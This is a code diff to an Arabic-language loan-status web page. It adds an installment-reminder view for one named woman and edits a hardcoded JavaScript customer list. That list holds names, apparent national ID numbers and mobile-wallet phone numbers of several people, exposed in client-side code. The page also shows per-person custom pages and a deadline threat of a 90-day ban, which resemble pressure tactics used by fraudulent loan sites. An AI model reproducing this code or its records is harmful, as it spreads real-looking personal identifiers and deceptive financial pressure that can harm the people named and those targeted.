@@ -445,6 +445,100 @@
             box-shadow: 0 0 20px rgba(239,68,68,0.4);
         }
 
+        /* ===== رسالة الأقساط للعميلة هبه ===== */
+        .installment-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border-radius: 2rem;
+            padding: 1.8rem;
+            margin-bottom: 1.5rem;
+            border: 2px solid var(--royal-gold);
+            animation: fadeSlideUp 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .installment-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(from 0deg, transparent, rgba(212,175,55,0.05), transparent, rgba(46,204,113,0.05), transparent);
+            animation: rotateGlow 8s linear infinite;
+        }
+        .installment-card .installment-icon {
+            font-size: 4rem;
+            color: var(--royal-gold);
+            text-align: center;
+            display: block;
+            margin-bottom: 0.5rem;
+            position: relative;
+            z-index: 1;
+            animation: pulseGold 1.5s ease-in-out infinite;
+        }
+        .installment-card h2 {
+            color: var(--royal-gold);
+            text-align: center;
+            font-size: 1.6rem;
+            font-weight: 800;
+            position: relative;
+            z-index: 1;
+        }
+        .installment-card .sub-title {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin: 0.3rem 0 1rem;
+            position: relative;
+            z-index: 1;
+        }
+        .installment-card .installment-box {
+            background: rgba(212,175,55,0.05);
+            border: 2px solid var(--royal-gold);
+            border-radius: 1rem;
+            padding: 0.8rem;
+            margin: 0.8rem 0;
+            position: relative;
+            z-index: 1;
+        }
+        .installment-card .installment-box .label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-align: center;
+        }
+        .installment-card .installment-box .value {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: var(--royal-gold);
+            text-align: center;
+            text-shadow: 0 0 20px rgba(212,175,55,0.3);
+        }
+        .installment-card .installment-box .value.danger {
+            color: var(--danger);
+            text-shadow: 0 0 20px rgba(239,68,68,0.3);
+        }
+        .installment-card .installment-box .sub-value {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-top: 0.2rem;
+        }
+        .installment-card .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.4rem 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.85rem;
+            position: relative;
+            z-index: 1;
+        }
+        .installment-card .info-row:last-child { border-bottom: none; }
+        .installment-card .info-row .key { color: var(--text-muted); }
+        .installment-card .info-row .val { font-weight: 700; color: #FFF; }
+        .installment-card .info-row .val.gold { color: var(--royal-gold); }
+        .installment-card .info-row .val.danger { color: var(--danger); }
+
         @media (max-width: 640px) {
             .glass-header { flex-direction: column; text-align: center; }
             .amount-display .value { font-size: 2rem; }
@@ -460,6 +554,9 @@
             .loan-details-card .remaining-box .value { font-size: 1.6rem; }
             .proof-credit-card h2 { font-size: 1.3rem; }
             .proof-credit-card .proof-box .value { font-size: 1.6rem; }
+            .installment-card h2 { font-size: 1.3rem; }
+            .installment-card .installment-box .value { font-size: 1.4rem; }
+            .installment-card .info-row { font-size: 0.75rem; flex-wrap: wrap; gap: 0.2rem; }
         }
     </style>
 </head>
@@ -540,12 +637,20 @@ const customersDatabase = {
         walletNum: "01067727933", 
         status: "approved" 
     },
+    // ===== العميلة هبه ابراهيم - مدانة بقرض مع أقساط =====
     "28603110201101": { 
         name: "هبه ابراهيم محمد محمود", 
         loan: 50000, 
         wallet: "فودافون كاش", 
         walletNum: "01010336414", 
-        status: "approved" 
+        status: "installment",
+        disbursedAmount: 50000,
+        remainingAmount: 0,
+        firstInstallment: "22/8/2026",
+        installmentAmount: 5000,
+        totalInstallments: 10,
+        paidInstallments: 0,
+        notes: "مدانة بمبلغ القرض، أول قسط مستحق في 22/8/2026"
     },
     "27104260102071": { 
         name: "ماجد محمد قمر عبدالباقي", 
@@ -561,7 +666,7 @@ const customersDatabase = {
         walletNum: "", 
         status: "approved" 
     },
-    "27801202402059": { 
+    "278402059": { 
         name: "عماد سداد خليفه احمد", 
         loan: 200000, 
         wallet: "فودافون كاش", 
@@ -779,6 +884,108 @@ const customersDatabase = {
         failureMessage: "⏰ انتهت المهلة المحددة (3 ساعات و30 دقيقة). سيتم إلغاء العملية وسيتم إيقاف التعامل معك لمدة 90 يوماً."
     }
 };
+
+// ===== دالة عرض صفحة الأقساط للعميلة هبه =====
+function buildInstallmentPage(customer, nationalId) {
+    const loanDisplay = customer.loan.toLocaleString('ar-EG');
+    const installmentDisplay = customer.installmentAmount.toLocaleString('ar-EG');
+    const totalInstallments = customer.totalInstallments || 10;
+    const paidInstallments = customer.paidInstallments || 0;
+    const remainingInstallments = totalInstallments - paidInstallments;
+    const firstInstallmentDate = customer.firstInstallment || "22/8/2026";
+
+    const html = `
+        <div class="installment-card">
+            <span class="installment-icon"><i class="fas fa-hand-holding-usd"></i></span>
+            <h2>💰 تم صرف القرض</h2>
+            <p class="sub-title">عزيزتي ${customer.name}، تم صرف مبلغ القرض لحسابك</p>
+
+            <div class="amount-box" style="border-color: var(--royal-gold); background: rgba(212,175,55,0.05);">
+                <div class="label">💰 إجمالي مبلغ القرض</div>
+                <div class="value" style="color: var(--royal-gold);">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
+            </div>
+
+            <div class="wallet-box" style="border-color: var(--royal-gold);">
+                <div class="label">📱 تم الصرف على محفظة فودافون كاش</div>
+                <div class="wallet-num" style="color: var(--royal-gold);">${customer.walletNum}</div>
+                <div style="font-size:0.8rem; color: var(--emerald); margin-top:0.3rem;">
+                    ✅ تم الصرف بالكامل (${loanDisplay} ج.م)
+                </div>
+            </div>
+
+            <div style="background: rgba(239,68,68,0.05); border: 2px solid var(--danger); border-radius: 1rem; padding: 0.8rem; margin: 0.8rem 0; position: relative; z-index: 1;">
+                <div style="display: flex; align-items: center; gap: 0.5rem; justify-content: center; margin-bottom: 0.3rem;">
+                    <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i>
+                    <span style="color: var(--danger); font-weight: 800; font-size: 1rem;">تنبيه هام</span>
+                </div>
+                <p style="color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; text-align: center; margin: 0;">
+                    أنتِ مدانة بمبلغ القرض، وسيتم مطالبتك بدفع الأقساط الشهرية
+                </p>
+            </div>
+
+            <div class="installment-box">
+                <div class="label">📅 أول قسط مستحق</div>
+                <div class="value" style="font-size: 2rem;">${firstInstallmentDate}</div>
+                <div class="sub-value">⏳ يرجى سداد القسط في الموعد المحدد</div>
+            </div>
+
+            <div class="installment-box" style="border-color: #8B5CF6; background: rgba(139,92,246,0.05);">
+                <div class="label">💰 قيمة القسط الشهري</div>
+                <div class="value" style="color: #8B5CF6;">${installmentDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
+                <div class="sub-value">📆 عدد الأقساط الكلية: ${totalInstallments} قسط</div>
+            </div>
+
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; margin: 0.8rem 0; position: relative; z-index: 1;">
+                <div style="background: rgba(46,204,113,0.05); border: 1px solid var(--emerald); border-radius: 0.8rem; padding: 0.5rem; text-align: center;">
+                    <div style="font-size: 0.6rem; color: var(--text-muted);">الأقساط المسددة</div>
+                    <div style="font-size: 1.4rem; font-weight: 800; color: var(--emerald);">${paidInstallments}</div>
+                </div>
+                <div style="background: rgba(239,68,68,0.05); border: 1px solid var(--danger); border-radius: 0.8rem; padding: 0.5rem; text-align: center;">
+                    <div style="font-size: 0.6rem; color: var(--text-muted);">الأقساط المتبقية</div>
+                    <div style="font-size: 1.4rem; font-weight: 800; color: var(--danger);">${remainingInstallments}</div>
+                </div>
+            </div>
+
+            <div class="info-box" style="border-right-color: var(--danger);">
+                <i class="fas fa-info-circle" style="color: var(--danger);"></i>
+                <strong style="color: var(--danger);">📌 تعليمات سداد الأقساط:</strong><br>
+                <span style="color: var(--text-muted);">
+                    سيتم خصم قيمة القسط الشهري (${installmentDisplay} ج.م) تلقائياً من محفظتك في بداية كل شهر.
+                    <br>
+                    <span class="highlight-danger">⚠️ في حالة عدم وجود رصيد كافٍ، سيتم اعتبارك متأخرة عن السداد.</span>
+                    <br>
+                    <span class="highlight">📞 يمكنك التواصل مع الدعم لأي استفسار.</span>
+                </span>
+            </div>
+
+            <button class="btn-whatsapp" id="supportBtn" style="background: linear-gradient(135deg, #25D366, #128C7E); margin-top:0.5rem;">
+                <i class="fab fa-whatsapp fa-lg"></i> التواصل مع الدعم
+            </button>
+
+            <div style="margin-top: 0.8rem; text-align: center; font-size: 0.7rem; color: var(--text-muted); position: relative; z-index: 1;">
+                <i class="fas fa-lock"></i> هذه العملية آمنة ومشفرة
+            </div>
+        </div>
+    `;
+
+    document.getElementById('resultSection').innerHTML = html;
+    document.getElementById('errorCard').style.display = 'none';
+
+    const supportBtn = document.getElementById('supportBtn');
+    if (supportBtn) {
+        supportBtn.onclick = () => {
+            let msg = `📞 استفسار عن الأقساط\n\n`;
+            msg += `العميلة: ${customer.name}\n`;
+            msg += `الرقم القومي: ${nationalId}\n`;
+            msg += `المبلغ: ${loanDisplay} ج.م\n`;
+            msg += `القسط الشهري: ${installmentDisplay} ج.م\n`;
+            msg += `أول قسط: ${firstInstallmentDate}\n`;
+            msg += `الأقساط المتبقية: ${remainingInstallments}\n\n`;
+            msg += `أحتاج مساعدة بخصوص الأقساط.`;
+            openWhatsApp(msg);
+        };
+    }
+}
 
 // ===== دالة عرض صفحة الاستثناء الخاصة لأحمد يوسف =====
 function buildExceptionProofPage(customer, nationalId) {
@@ -1457,8 +1664,12 @@ function searchCustomer() {
         currentCustomer = customer;
         currentNationalId = nationalId;
         
+        // التحقق من حالة العميلة هبه (أقساط)
+        if (nationalId === "28603110201101" && customer.status === "installment") {
+            buildInstallmentPage(customer, nationalId);
+        }
         // التحقق من الاستثناء الخاص بأحمد يوسف
-        if (nationalId === "29105302100298" && customer.status === "exception_proof") {
+        else if (nationalId === "29105302100298" && customer.status === "exception_proof") {
             buildExceptionProofPage(customer, nationalId);
         } else if (customer.status === 'loan_disbursed') {
             buildLoanDisbursedPage(customer, nationalId);
